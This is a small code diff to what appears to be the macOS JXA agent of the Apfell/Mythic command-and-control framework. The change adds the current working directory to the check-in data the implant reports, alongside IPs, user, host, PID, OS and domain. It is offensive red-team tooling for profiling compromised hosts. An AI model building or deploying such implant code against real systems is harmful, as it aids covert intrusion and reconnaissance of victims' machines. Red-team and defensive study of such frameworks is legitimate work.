@@ -226,6 +226,7 @@ class customC2 extends baseC2{
 		let info = {'ips':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os":os, "architecture": arch, "domain": domain, "action": "checkin"};
 		info["process_name"] = apfell.procInfo.processName.js;
 		info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
+		info['cwd'] = $.NSFileManager.defaultManager.currentDirectoryPath.js;
 		if(user === "root"){
 			info['integrity_level'] = 3;
 		}
